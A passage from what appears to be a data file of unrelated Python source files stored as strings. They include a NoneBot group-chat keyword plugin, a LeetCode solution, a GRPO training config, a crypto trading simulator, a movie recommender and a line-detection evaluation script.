    "import re\nimport json\nimport random\nimport asyncio\n\nfrom pathlib import Path\nfrom typing import Literal\nfrom nonebot import (\n    require,\n    get_driver,\n    get_plugin_config\n)\nfrom nonebot.log import logger\nfrom nonebot.params import CommandArg\nfrom nonebot.typing import T_State\nfrom nonebot.plugin import PluginMetadata\nfrom nonebot.plugin.on import (\n    on_command,\n    on_message\n)\nfrom nonebot.adapters.onebot.v11 import (\n    Bot,\n    Message,\n    MessageEvent,\n    MessageSegment,\n    GroupMessageEvent\n)\nfrom .config import Config\nfrom .envious import GroupEnviousManager\n\n\n__plugin_meta__ = PluginMetadata(\n    name=\"\u7fa1\u6155 koishi\",\n    description=\"\u590d\u8bfb\u7fa1\u6155\uff0c\u5e76\u6536\u7eb3\u5173\u952e\u8bcd\uff0c\u81ea\u52a8\u7fa1\u6155\",\n    usage=\"\u7fa1\u6155xxx/\u6e05\u7a7a\u7fa1\u6155/\u5f53\u524d\u7fa1\u6155\",\n    type=\"application\",\n    config=Config,\n    homepage=\"https://github.com/fllesser/nonebot-plugin-envious\",\n    supported_adapters={ \"~onebot.v11\" }\n)\n\nENVIOUS_KEY: Literal[\"_envious_key\"] = \"_envious_key\"\n\neconfig: Config = get_plugin_config(Config)\nMAX_LEN: int = econfig.envious_max_len\n\ngem: GroupEnviousManager = GroupEnviousManager(econfig.envious_list)\n\n@get_driver().on_startup\nasync def _():\n    gem.load()\n    logger.info(f\"\u7fa1\u6155\u5217\u8868: {gem.envious_list}\")\n    logger.info(f\"\u7fa1\u6155\u5173\u952e\u8bcd\u6700\u5927\u957f\u5ea6: {MAX_LEN} \u7fa1\u6155\u6982\u7387: {econfig.envious_probability}\")\n    \n    \ndef contains_keywords(event: MessageEvent, state: T_State) -> bool:\n    if not isinstance(event, GroupMessageEvent):\n        return False\n    msg = event.get_message().extract_plain_text().strip()\n    if not msg:\n        return False\n    if key := next((k for k in gem.envious_list if k in msg), None):\n        if gem.triggered(event.group_id, key):\n            return False\n        state[ENVIOUS_KEY] = key\n        return True\n    return False\n\n\nenvious = on_message(rule = contains_keywords, priority = 1027)\nenvious_cmd = on_command(cmd = '\u7fa1\u6155', block = True)\nclear_envious = on_command(cmd = '\u6e05\u7a7a\u7fa1\u6155')\nlist_envious = on_command(cmd = '\u5f53\u524d\u7fa1\u6155')\n\n@envious.handle()\nasync def _(event: GroupMessageEvent, state: T_State):\n    keyword = state.get(ENVIOUS_KEY)\n    await gem.update_last_envious(event.group_id, keyword)\n    await envious.send(\"\u7fa1\u6155\" + keyword)\n\n@envious_cmd.handle()\nasync def _(event: GroupMessageEvent, args: Message = CommandArg()):\n    keyword = args.extract_plain_text().strip()\n    gid = event.group_id\n    \n    if not keyword or '\u7fa1\u6155' in keyword or gem.triggered(gid, keyword):\n        return\n    if len(keyword) > MAX_LEN and (match := re.search(r'[0-9A-Za-z]+', keyword)):\n        keyword = match.group(0)\n    if len(keyword) > MAX_LEN:\n        await envious_cmd.finish(\"\u4f60\u5728\u778e\u7fa1\u6155\u4ec0\u4e48\u5462\uff1f\")\n    # \u6982\u7387\u4e0d\u7fa1\u6155\n    if random.random() > econfig.envious_probability:\n        res = random.choice([\n            f\"\u600e\u4e485202\u5e74\u4e86\uff0c\u8fd8\u6709\u4eba\u7fa1\u6155{keyword}\u554a\",\n            \"\u4e0d\u662f, \u8fd9tm\u6709\u5565\u597d\u7fa1\u6155\u7684\"\n        ])\n        await envious_cmd.finish(res)\n        \n    await gem.update_last_envious(gid, keyword)\n    gem.add_envious(keyword)\n    await envious_cmd.send(\"\u7fa1\u6155\" + keyword)\n\n@clear_envious.handle()\nasync def _():\n    await gem.clear()\n    await clear_envious.send(\"\u54fc(`3\u00b4)\uff0c\u6211\u5565\u4e5f\u4e0d\u4f1a\u7fa1\u6155\u4e86\")\n    \n@list_envious.handle()\nasync def _():\n    if envious_str := '\u3001'.join(gem.envious_list):\n        res = f\"\u6211\u73b0\u5728\u5de8tm\u7fa1\u6155{envious_str}\"\n    else:\n        res = \"\u4e0d\u597d\u610f\u601d\uff0c\u6211\u5565\u4e5f\u4e0d\u7fa1\u6155\"\n    await list_envious.send(res)",
    "ascii_art = {\n'A': \"\"\"\n .ooo. \noo' 'oo\nooooooo\noo~~~oo\noo   oo\noo   oo\n\"\"\",\n\n'B' : \"\"\"\noooooo.\noo  `oo\noooooo'\noo~~~o.\noo   oo\noooooo'\n\"\"\",\n\n'C' : \"\"\"\n .oooo.\nooo  oo\noo     \noo     \nooo  oo\n `oooo'\n\"\"\",\n\n'D': \"\"\"\noooooo.\noo  `oo\noo   oo\noo   oo\noo  .oo\noooooo'\n\"\"\",\n\n'E' : \"\"\"\nooooooo\noo'    \nooooooo\noo~~~~~\noo.    \nooooooo\n\"\"\",\n\n'F' : \"\"\"\nooooooo\noo'    \nooooooo\noo~~~~~\noo     \noo     \n\"\"\",\n\n'G' : \"\"\"\n .oooo. \nooo  oo \noo      \noo  oooo\nooo  oo \n `oooo' \n\"\"\",\n\n'H' : \"\"\"\noo   oo\noo   oo\nooooooo\noo~~~oo\noo   oo\noo   oo\n\"\"\",\n\n'I' : \"\"\"\noooooooo \n  'oo'   \n   oo    \n   oo    \n  .oo.   \noooooooo \n\"\"\",\n\n'J' : \"\"\"\n   oooo \n   `oo' \n    oo  \n    oo  \noo. oo  \noooooo  \n\"\"\",\n\n'K' : \"\"\"\noo   oo \noo ,oo' \noo,oo   \noo`oo   \noo `oo. \noo   oo \n\"\"\",\n\n'L' : \"\"\"\noo      \noo      \noo      \noo      \noooooo. \nooooooo \n\"\"\",\n\n'M' : \"\"\"\n.ooo  ooo. \noo'oooo'oo \noo  oo  oo \noo  oo  oo \noo  oo  oo \noo  oo  oo \n\"\"\",\n\n'N' : \"\"\"\nooo   oo \noooo  oo \nooVoo oo \noo Voooo \noo  Vooo \nVo   Voo \n\"\"\",\n\n'O' : \"\"\"\n .oooo.  \n.oo  oo. \noo    oo \noo    oo \n`oo  oo' \n `oooo'  \n\"\"\",\n\n'P' : \"\"\"\noooooo. \noo  `oo \noooooo' \noo~~~   \noo      \noo      \n\"\"\",\n\n'Q' : \"\"\"\n .oooo.  \n.oo  oo. \noo    oo \noo    oo \n`oo  oo' \n `ooo'oo \n\"\"\",\n\n'R' : \"\"\"\noooooo. \noo  `oo \noooooo' \noo`oo   \noo `oo. \noo   oo \n\"\"\",\n\n'S' : \"\"\"\n.ooooo. \noo'  oo \n`ooo.   \n  `ooo. \noo   oo \n`ooooo' \n\"\"\",\n\n'T' : \"\"\"\noooooooo \n`oooooo' \n   oo    \n   oo    \n   oo    \n   oo    \n\"\"\",\n\n'U' : \"\"\"\noo    oo \noo    oo \noo    oo \noo    oo \nooo  ooo \n oooooo  \n\"\"\",\n\n'V' : \"\"\"\noo    oo \noo    oo \noo    oo \n'oo  oo' \n 'oooo'  \n   oo    \n\"\"\",\n\n'W' : \"\"\"\noo   ooo   oo \noo   IoI   oo \noo   IoI   oo \noo   IoI   oo \n'oo oo'oo oo' \n 'ooo' 'ooo'  \n\"\"\",\n\n'X' : \"\"\"\noo    oo \n'oo  oo' \n 'oooo'  \n .oooo.  \n.oo  oo. \noo    oo \n\"\"\",\n\n'Y' : \"\"\"\noo    oo \n'oo  oo' \n 'oooo'  \n   oo    \n   oo    \n   oo    \n\"\"\",\n\n'Z' : \"\"\"\nooooooo \noo  oo' \n   oo'  \n  oo'   \n oo' oo \nooooooo \n\"\"\",\n\n' ' : \"\"\"\n        \n        \n        \n        \n        \n        \n\"\"\"\n}",
    "''' Time Complexity O(n)\r\nYou are given a 0-indexed array of strings words and a 2D array of integers queries.\r\nEach query queries[i] = [li, ri] asks us to find the number of strings present in the range\r\nli to ri (both inclusive) of words that start and end with a vowel.\r\nReturn an array ans of size queries.length, where ans[i] is the answer to the ith query.\r\nNote that the vowel letters are 'a', 'e', 'i', 'o', and 'u'.\r\nExample 1:\r\nInput: words = [\"aba\",\"bcb\",\"ece\",\"aa\",\"e\"], queries = [[0,2],[1,4],[1,1]]\r\nOutput: [2,3,0]\r\nExplanation: The strings starting and ending with a vowel are \"aba\", \"ece\", \"aa\" and \"e\".\r\nThe answer to the query [0,2] is 2 (strings \"aba\" and \"ece\").\r\nto query [1,4] is 3 (strings \"ece\", \"aa\", \"e\").\r\nto query [1,1] is 0.\r\nWe return [2,3,0].\r\n'''\r\nfrom typing import *\r\nclass Solution:\r\n    def vowelStrings(self, words: List[str], queries: List[List[int]]) -> List[int]:\r\n        vowel=['a','e','i','o','u']\r\n        preFix=[0]\r\n        res=[]\r\n        count=0\r\n        for i in words:\r\n            if i[0] in vowel and i[len(i)-1] in vowel:\r\n                count+=1\r\n            preFix.append(count)\r\n        for i in queries:\r\n            res.append(preFix[i[1]+1]-preFix[i[0]])\r\n        return res   \r\n",
    "#!/usr/bin/env python3\n\"\"\"\nexamples/discovery_demo.py\n\nDemonstrates the GitSage discovery node functionality by analyzing the GitSage\nrepository itself. This shows the first step of the GitSage pipeline: commit\ndiscovery and analysis.\n\"\"\"\n\nimport argparse\nimport os\nimport sys\n\nfrom gitsage.nodes.commit_discovery_node import load_discovery_node\nfrom gitsage.models.state import AgentState\n\n\ndef parse_args():\n    \"\"\"Parse command line arguments.\"\"\"\n    parser = argparse.ArgumentParser(description=\"Demonstrate GitSage's commit discovery functionality\")\n    parser.add_argument(\n        \"--repo-path\",\n        type=str,\n        default=os.getcwd(),\n        help=\"Path to Git repository (default: current directory)\",\n    )\n    parser.add_argument(\n        \"--since-ref\",\n        type=str,\n        help=\"Git reference to start from (default: latest release tag)\",\n    )\n    return parser.parse_args()\n\n\ndef format_commit_info(commit) -> str:\n    \"\"\"Format a single commit's information for display.\n\n    Args:\n        commit: CommitInfo object containing commit details\n\n    Returns:\n        Formatted string containing commit information\n    \"\"\"\n    files_changed_str = \"\\n  - \".join(\n        [commit.files_changed[0]]  # First file\n        + [f\"{f}\" for f in commit.files_changed[1:]]  # Remaining files\n        if commit.files_changed\n        else [\"No files changed\"]\n    )\n\n    return f\"\"\"\nCommit: {commit.hash[:8]}\nAuthor: {commit.author}\nDate: {commit.date.strftime('%Y-%m-%d %H:%M:%S')}\nFiles Changed ({len(commit.files_changed)}):\n  - {files_changed_str}\nMessage: {commit.message}\n{'=' * 80}\n\"\"\"\n\n\ndef main():\n    \"\"\"Run the discovery node demo.\"\"\"\n    args = parse_args()\n    repo_path = args.repo_path\n\n    print(f\"Running GitSage discovery node on repository: {repo_path}\")\n    print(f\"Using reference: {args.since_ref or 'latest release tag'}\")\n\n    try:\n        # Initialize the discovery node\n        node = load_discovery_node(repo_path)\n\n        # Create initial state\n        initial_state: AgentState = {}\n        if args.since_ref is not None:\n            initial_state[\"since_ref\"] = args.since_ref\n\n        # Run the node\n        state = node.run(initial_state)\n\n        # Print summary\n        print(f\"\\nDiscovered {state['commit_count']} commits\")\n        print(f\"Context: {state['context']}\")\n        print(f\"Last tag: {state['last_tag'] or 'No tags found'}\")\n        if state[\"start_ref\"]:\n            print(f\"Commit range: {state['start_ref']}..{state['end_ref']}\")\n        else:\n            print(f\"Showing: All commits up to {state['end_ref']}\")\n\n        # Print detailed commit information\n        print(\"\\nDetailed commit information:\")\n        for commit in state[\"commits\"]:\n            print(format_commit_info(commit))\n\n    except Exception as e:\n        print(f\"Error running discovery node: {str(e)}\", file=sys.stderr)\n        return 1\n\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
    "# Copyright 2025 The HuggingFace Team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom dataclasses import dataclass, field\nfrom typing import Optional\n\nfrom transformers import TrainingArguments\n\n\n@dataclass\nclass GRPOConfig(TrainingArguments):\n    r\"\"\"\n    Configuration class for the [`GRPOTrainer`].\n\n    Only the parameters specific to GRPO training are listed here. For details on other parameters, refer to the\n    [`~transformers.TrainingArguments`] documentation.\n\n    Using [`~transformers.HfArgumentParser`] we can turn this class into\n    [argparse](https://docs.python.org/3/library/argparse#module-argparse) arguments that can be specified on the\n    command line.\n\n    Parameters:\n        > Parameters that control the model and reference model\n\n        model_init_kwargs (`dict[str, Any]` or `None`, *optional*, defaults to `None`):\n            Keyword arguments for [`~transformers.AutoModelForCausalLM.from_pretrained`], used when the `model`\n            argument of the [`GRPOTrainer`] is provided as a string.\n\n        > Parameters that control the data preprocessing\n\n        max_prompt_length (`int` or `None`, *optional*, defaults to `512`):\n            Maximum length of the prompt. If the prompt is longer than this value, it will be truncated left.\n        num_generations (`int` or `None`, *optional*, defaults to `8`):\n            Number of generations per prompt to sample.\n        temperature (`float`, *optional*, defaults to `0.9`):\n            Temperature for sampling. The higher the temperature, the more random the completions.\n        max_completion_length (`int` or `None`, *optional*, defaults to `None`):\n            Maximum length of the generated completion.\n\n        > Parameters that control the training\n\n        learning_rate (`float`, *optional*, defaults to `1e-6`):\n            Initial learning rate for [`AdamW`] optimizer. The default value replaces that of\n            [`~transformers.TrainingArguments`].\n        beta (`float`, *optional*, defaults to `0.04`):\n            KL coefficient.\n    \"\"\"\n\n    # Parameters that control the model and reference model\n    model_init_kwargs: Optional[dict] = field(\n        default=None,\n        metadata={\n            \"help\": \"Keyword arguments for `transformers.AutoModelForCausalLM.from_pretrained`, used when the `model` \"\n            \"argument of the `GRPOTrainer` is provided as a string.\"\n        },\n    )\n\n    # Parameters that control the data preprocessing\n    max_prompt_length: Optional[int] = field(\n        default=512,\n        metadata={\n            \"help\": \"Maximum length of the prompt. If the prompt is longer than this value, it will be truncated left.\"\n        },\n    )\n    num_generations: Optional[int] = field(\n        default=8,\n        metadata={\"help\": \"Number of generations to sample.\"},\n    )\n    temperature: Optional[float] = field(\n        default=0.9,\n        metadata={\"help\": \"Temperature for sampling. The higher the temperature, the more random the completions.\"},\n    )\n    max_completion_length: Optional[int] = field(\n        default=256,\n        metadata={\"help\": \"Maximum length of the generated completion.\"},\n    )\n\n    # Parameters that control the training\n    learning_rate: float = field(\n        default=1e-6,\n        metadata={\n            \"help\": \"Initial learning rate for `AdamW` optimizer. The default value replaces that of \"\n            \"`transformers.TrainingArguments`.\"\n        },\n    )\n    beta: float = field(\n        default=0.04,\n        metadata={\"help\": \"KL coefficient.\"},\n    )\n",
    "import json\nimport requests\nfrom datetime import datetime\n\nclass CryptoTradingSim:\n    API_URL = \"https://api.coingecko.com/api/v3/simple/price\"\n    CURRENCY = \"usd\"\n\n    def __init__(self):\n        self.balance = 10000.0  # Starting virtual balance in USD\n        self.portfolio = {}\n        self.history = []\n        self.load_data()\n\n    def fetch_price(self, crypto_id):\n        \"\"\"\n        Fetch the current price of a cryptocurrency in USD.\n        \"\"\"\n        params = {\"ids\": crypto_id, \"vs_currencies\": self.CURRENCY}\n        try:\n            response = requests.get(self.API_URL, params=params)\n            response.raise_for_status()\n            data = response.json()\n            return data.get(crypto_id, {}).get(self.CURRENCY, None)\n        except requests.exceptions.RequestException:\n            print(\"Error fetching price. Please check your connection.\")\n            return None\n\n    def buy_crypto(self, crypto_id, amount_usd):\n        \"\"\"\n        Buy cryptocurrency worth `amount_usd`.\n        \"\"\"\n        price = self.fetch_price(crypto_id)\n        if price is None:\n            print(\"Could not fetch price. Try again later.\")\n            return\n        quantity = amount_usd / price\n        if amount_usd > self.balance:\n            print(\"Insufficient balance.\")\n            return\n        self.balance -= amount_usd\n        self.portfolio[crypto_id] = self.portfolio.get(crypto_id, 0) + quantity\n        self.record_trade(\"BUY\", crypto_id, price, quantity)\n        print(f\"Bought {quantity:.6f} {crypto_id} at ${price:.2f}.\")\n\n    def sell_crypto(self, crypto_id, quantity):\n        \"\"\"\n        Sell a specific quantity of cryptocurrency.\n        \"\"\"\n        if crypto_id not in self.portfolio or self.portfolio[crypto_id] < quantity:\n            print(\"Insufficient quantity in portfolio.\")\n            return\n        price = self.fetch_price(crypto_id)\n        if price is None:\n            print(\"Could not fetch price. Try again later.\")\n            return\n        amount_usd = quantity * price\n        self.balance += amount_usd\n        self.portfolio[crypto_id] -= quantity\n        if self.portfolio[crypto_id] == 0:\n            del self.portfolio[crypto_id]\n        self.record_trade(\"SELL\", crypto_id, price, quantity)\n        print(f\"Sold {quantity:.6f} {crypto_id} at ${price:.2f}.\")\n\n    def record_trade(self, action, crypto_id, price, quantity):\n        \"\"\"\n        Record a trade in the trading history.\n        \"\"\"\n        trade = {\n            \"timestamp\": datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\"),\n            \"action\": action,\n            \"crypto_id\": crypto_id,\n            \"price\": price,\n            \"quantity\": quantity,\n        }\n        self.history.append(trade)\n        self.save_data()\n\n    def show_portfolio(self):\n        \"\"\"\n        Display the current portfolio and its total value.\n        \"\"\"\n        total_value = 0\n        print(\"\\n--- Portfolio ---\")\n        for crypto, quantity in self.portfolio.items():\n            price = self.fetch_price(crypto)\n            if price is not None:\n                value = quantity * price\n                total_value += value\n                print(f\"{crypto.capitalize()}: {quantity:.6f} (${value:.2f})\")\n        print(f\"Total Portfolio Value: ${total_value:.2f}\")\n        print(f\"Available Balance: ${self.balance:.2f}\")\n\n    def show_history(self):\n        \"\"\"\n        Display the trading history.\n        \"\"\"\n        print(\"\\n--- Trading History ---\")\n        for trade in self.history:\n            print(\n                f\"{trade['timestamp']} - {trade['action']} {trade['quantity']:.6f} {trade['crypto_id']} at ${trade['price']:.2f}\"\n            )\n\n    def save_data(self):\n        \"\"\"\n        Save portfolio and trading history to a JSON file.\n        \"\"\"\n        data = {\"balance\": self.balance, \"portfolio\": self.portfolio, \"history\": self.history}\n        with open(\"trading_history.json\", \"w\") as f:\n            json.dump(data, f, indent=4)\n\n    def load_data(self):\n        \"\"\"\n        Load portfolio and trading history from a JSON file.\n        \"\"\"\n        try:\n            with open(\"trading_history.json\", \"r\") as f:\n                data = json.load(f)\n                self.balance = data.get(\"balance\", self.balance)\n                self.portfolio = data.get(\"portfolio\", {})\n                self.history = data.get(\"history\", [])\n        except FileNotFoundError:\n            pass\n\ndef main():\n    sim = CryptoTradingSim()\n    while True:\n        print(\"\\n--- Crypto Trading Simulator ---\")\n        print(\"1. Buy Cryptocurrency\")\n        print(\"2. Sell Cryptocurrency\")\n        print(\"3. View Portfolio\")\n        print(\"4. View Trading History\")\n        print(\"5. Exit\")\n        choice = input(\"Enter your choice: \").strip()\n\n        if choice == \"1\":\n            crypto_id = input(\"Enter cryptocurrency ID (e.g., bitcoin): \").strip().lower()\n            amount = float(input(\"Enter amount in USD: \"))\n            sim.buy_crypto(crypto_id, amount)\n        elif choice == \"2\":\n  ",
    "import json\nimport logging\nfrom pathlib import Path\nfrom typing import Any, Dict\n\n# Define the set of valid field types for your schema\nVALID_TYPES = {\n    \"uuid\",\n    \"string\",\n    \"integer\",\n    \"float\",\n    \"date_between\",\n    \"email\",\n    \"phone\",\n    \"name\",\n    \"foreign_key\",\n    # Add or remove types based on your project's needs\n}\n\n\ndef load_schema(schema_path: Path) -> Dict[str, Any]:\n    \"\"\"Load and validate the JSON schema from the given path.\n\n    Args:\n        schema_path (Path): The path to the schema JSON file.\n\n    Returns:\n        Dict[str, Any]: A dictionary containing the schema definitions.\n    \"\"\"\n    if not schema_path.exists():\n        logging.error(f\"Schema file not found: {schema_path}\")\n        raise FileNotFoundError(f\"Schema file not found: {schema_path}\")\n\n    with schema_path.open(\"r\", encoding=\"utf-8\") as f:\n        schema = json.load(f)\n\n    if not isinstance(schema, dict):\n        logging.error(\"Invalid schema format. The root element should be a dictionary.\")\n        raise ValueError(\"Schema must be a dictionary of tables.\")\n\n    # Validate each table has 'fields'\n    for table_name, table_def in schema.items():\n        if \"fields\" not in table_def or not isinstance(table_def[\"fields\"], dict):\n            logging.error(f\"Table {table_name} must have a 'fields' dict.\")\n            raise ValueError(f\"Table {table_name} must have a 'fields' dictionary.\")\n\n        for field_name, field_def in table_def[\"fields\"].items():\n            # Ensure a 'type' key is present\n            if \"type\" not in field_def:\n                logging.error(f\"Field {field_name} in table {table_name} is missing 'type'.\")\n                raise ValueError(f\"Every field must have a 'type': {table_name}.{field_name}\")\n\n            # Check if the 'type' is one of the known valid types\n            field_type = field_def[\"type\"]\n            if field_type not in VALID_TYPES:\n                logging.error(\n                    f\"Field {field_name} in table {table_name} has invalid type '{field_type}'. \"\n                    f\"Valid types are: {', '.join(sorted(VALID_TYPES))}\"\n                )\n                raise ValueError(\n                    f\"Invalid field type '{field_type}' in table '{table_name}'. \"\n                    f\"Must be one of: {', '.join(sorted(VALID_TYPES))}.\"\n                )\n\n    logging.info(\"Schema loaded and validated successfully.\")\n    return schema\n",
    "# -*- coding: utf-8 -*-\n\"\"\"Movie_recommendation_system_ML_python.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1GoPbdZtp5e-5UELK5SMr6_yvehOkfCni\n\"\"\"\n\n#importing required libraries\nimport numpy as np\nimport pandas as pd\nimport difflib\nfrom sklearn.feature_extraction.text import TfidfVectorizer # convert text to integer\nfrom sklearn.metrics.pairwise import cosine_similarity\n\n\"\"\"##Data preprocessing\"\"\"\n\n#loading the dataset\nmovies_df=pd.read_csv(\"/content/movies.csv\")\n\nmovies_df.head() #printing first 5 datas from the dataset\n\n#checking the number of rows and columns\nmovies_df.shape\n\n#selecting the relevant features for recommendation\nselected_features=['genres','keywords','tagline','cast','director']\nprint(selected_features)\n\n#replacing the null values with null string\n\nfor feature in selected_features:\n  movies_df[feature]=movies_df[feature].fillna('')\n\n#combining all the 5 selected features\n\ncombined_features=movies_df['genres']+' '+movies_df['keywords']+' '+movies_df['tagline']+' '+movies_df['cast']+' '+movies_df['director']\n\nprint(combined_features)\n\n\"\"\"#converting text data into feature vector\"\"\"\n\nvectorizer=TfidfVectorizer()\n\nfeature_vector=vectorizer.fit_transform(combined_features)\n\nprint(feature_vector)\n\n\"\"\"#Performing cosine simalirity to get similarity score\"\"\"\n\nsimilarity=cosine_similarity(feature_vector)\n\nprint(similarity)\n\nprint(similarity.shape) #In output first value represents the index value and the sceond value is the similarity score\n\n#getting the movie name from the user\nmovie_name=input('enter the favourite movie name:')\n\n#creating a list with all the movie names given in the dataset\nlist_of_all_titles=movies_df['title'].tolist()\nprint(list_of_all_titles)\n\n#finding the best match given by user\nfind_close_match=difflib.get_close_matches(movie_name,list_of_all_titles)\nprint(find_close_match)\n\nclose_match=find_close_match[0]\nprint(close_match)\n\n\"\"\"##Finding index of the movie\"\"\"\n\nindex_of_the_movie=movies_df[movies_df.title==close_match]['index'].values[0]\nprint(index_of_the_movie)\n\nsimilarity_score=list(enumerate(similarity[index_of_the_movie]))\nprint(similarity_score)\n\nlen(similarity_score)\n\n#checking the higher similarity score for that sortng the movies based on the similarity score\nsorted_similar_movies=sorted(similarity_score ,key=lambda x:x[1] ,reverse=True)\nprint(sorted_similar_movies)\n\n\"\"\"##The name of similar movies based on thier index\"\"\"\n\nprint('Movies suggested:\\n')\ni=1\nfor movie in sorted_similar_movies:\n  index=movie[0]\n  title_from_index=movies_df[movies_df.index==index]['title'].values[0]\n  if(i<20):\n    print(i,'.',title_from_index)\n    i+=1\n\n\"\"\"#movie recommendation system\"\"\"\n\nmovie_name=input('enter the favourite movie name:')\n\nlist_of_all_titles=movies_df['title'].tolist()\n\nfind_close_match=difflib.get_close_matches(movie_name,list_of_all_titles)\n\nclose_match=find_close_match[0]\n\nindex_of_the_movie=movies_df[movies_df.title==close_match]['index'].values[0]\n\nsimilarity_score=list(enumerate(similarity[index_of_the_movie]))\n\nsorted_similar_movies=sorted(similarity_score ,key=lambda x:x[1] ,reverse=True)\n\nprint('Movies suggested:\\n')\ni=1\nfor movie in sorted_similar_movies:\n  index=movie[0]\n  title_from_index=movies_df[movies_df.index==index]['title'].values[0]\n  if(i<20):\n    print(i,'.',title_from_index)\n    i+=1",
    "import torch\n\nfrom hawp.base.utils.comm import to_device\nfrom hawp.base.utils.logger import setup_logger\nfrom hawp.base.utils.checkpoint import DetectronCheckpointer\nfrom hawp.base.utils.metric_evaluation import TPFP, AP\n\nfrom hawp.fsl.config import cfg\nfrom hawp.fsl.config.paths_catalog import DatasetCatalog\nfrom hawp.fsl.dataset import build_test_dataset\nfrom hawp.fsl.model.build import build_model\n\nimport os\nimport os.path as osp\nimport argparse\nimport logging\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\nimport json\nimport numpy as np\nimport importlib\nimport time\nimport random\n\nAVAILABLE_DATASETS = {\n    'wireframe': 'wireframe_test', \n    'york': 'york_test'\n}\nTHRESHOLDS = [5, 10, 15]\n\ndef plot_pr_curve(P, R, F, path):\n    f_scores = np.linspace(0.2,0.9,num=8).tolist()\n            \n    for f_score in f_scores:\n        x = np.linspace(0.01,1)\n        y = f_score*x/(2*x-f_score)\n        l, = plt.plot(x[y >= 0], y[y >= 0], color=[0,0.5,0], alpha=0.3)\n        plt.annotate(\"f={0:0.1}\".format(f_score), xy=(0.9, y[45] + 0.02), alpha=0.4,fontsize=10)\n    \n    plt.rc('legend',fontsize=10)\n    plt.grid(True)\n    plt.axis([0.0, 1.0, 0.0, 1.0])\n    plt.xticks(np.arange(0, 1.0, step=0.1))\n    plt.xlabel(\"Recall\")\n    plt.ylabel(\"Precision\")\n    plt.yticks(np.arange(0, 1.0, step=0.1))\n    plt.plot(rcs,pcs,'r-')\n    plt.plot(R,P,'.',color=[0,0.5,0],)\n    plt.annotate(\"f={0:0.3}\".format(F), xy=(R, P + 0.02), alpha=0.4,fontsize=10)\n\n    plt.title(sAP_string)\n    plt.savefig(path)\n\ndef sAPEval(result_list, annotations_dict, threshold):\n    tp_list, fp_list, scores_list = [],[],[]\n    n_gt = 0\n    for res in result_list:\n        filename = res['filename']\n        gt = annotations_dict[filename]\n        lines_pred = np.array(res['lines_pred'],dtype=np.float32)\n        scores = np.array(res['lines_score'],dtype=np.float32)\n        sort_idx = np.argsort(-scores)\n        \n        lines_pred = lines_pred[sort_idx]\n        scores = scores[sort_idx]\n        # import pdb; pdb.set_trace()\n        lines_pred[:,0] *= 128/float(res['width'])\n        lines_pred[:,1] *= 128/float(res['height'])\n        lines_pred[:,2] *= 128/float(res['width'])\n        lines_pred[:,3] *= 128/float(res['height'])\n\n        lines_gt   = np.array(gt['lines'],dtype=np.float32)\n        lines_gt[:,0]  *= 128/float(gt['width'])\n        lines_gt[:,1]  *= 128/float(gt['height'])\n        lines_gt[:,2]  *= 128/float(gt['width'])\n        lines_gt[:,3]  *= 128/float(gt['height'])\n        \n        assert gt['width'] == res['width'] and gt['height'] == res['height']\n        \n        tp, fp = TPFP(lines_pred,lines_gt,threshold)\n        n_gt += lines_gt.shape[0]\n        tp_list.append(tp)\n        fp_list.append(fp)\n        scores_list.append(scores)\n\n    tp_list = np.concatenate(tp_list)\n    fp_list = np.concatenate(fp_list)\n    scores_list = np.concatenate(scores_list)\n    idx = np.argsort(scores_list)[::-1]\n    tp = np.cumsum(tp_list[idx])/n_gt\n    fp = np.cumsum(fp_list[idx])/n_gt\n    rcs = tp\n    pcs = tp/np.maximum(tp+fp,1e-9)\n    F_list = (2*rcs*pcs/(rcs+pcs+1e-9))\n    F_list = np.nan_to_num(F_list, 0)\n    F = F_list.max()\n    \n    P = pcs[F_list.argmax()]\n    R = rcs[F_list.argmax()]\n\n    sAP = AP(tp,fp)\n\n    return sAP, P, R, F\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='HAWP Testing')\n    parser.add_argument('config', help = 'the path of config file')\n    parser.add_argument(\"--ckpt\",type=str,required=True)\n\n    parser.add_argument(\"--dataset\", default='wireframe', choices=['wireframe','york'])\n\n    parser.add_argument(\"--j2l\", default = None, type = float, help = 'the threshold for junction-line attraction')\n\n    parser.add_argument(\"--jhm\", default = None, type = float, help = 'the threshold for junction heatmap')\n\n    parser.add_argument(\"--rscale\",default=2, type=int, help='the residual scale')\n\n    parser.add_argument('--seed',default=42,type=int)\n    parser.add_argument('--output', default=None, help = 'the path of outputs')\n\n    args = parser.parse_args()\n\n    config_path = args.config\n    cfg.merge_from_file(config_path)\n    root = args.output\n\n    if root is None:\n        root = os.path.dirname(args.ckpt)\n\n    cfg.DATASETS.TEST = (AVAILABLE_DATASETS.get(args.dataset),)\n\n    logger = setup_logger('hawp.testing', root)\n    logger.info(args)\n    logger.info(\"Loaded configuration file {}\".format(config_path))\n    random.seed(args.seed)\n    np.random.seed(args.seed)\n    torch.manual_seed(args.seed)\n    if torch.cuda.is_available():\n        torch.cuda.manual_seed(args.seed)\n    device = cfg.MODEL.DEVICE\n\n    model = build_model(cfg)\n    model = model.to(cfg.MODEL.DEVICE)\n\n    if args.rscale is not None:\n        model.use_residual = args.rscale\n\n    if args.j2l:\n        model.j2l_threshold = args.j2l\n\n    if args.jhm:\n        model.jhm_threshold = args.jhm\n    \n    if args.dataset == 'york':\n        model.topk_junctions = 512\n    \n    test_datasets = build_test_dataset(cfg)\n\n    ckpt = torch.load(args.ckpt, map_locati",
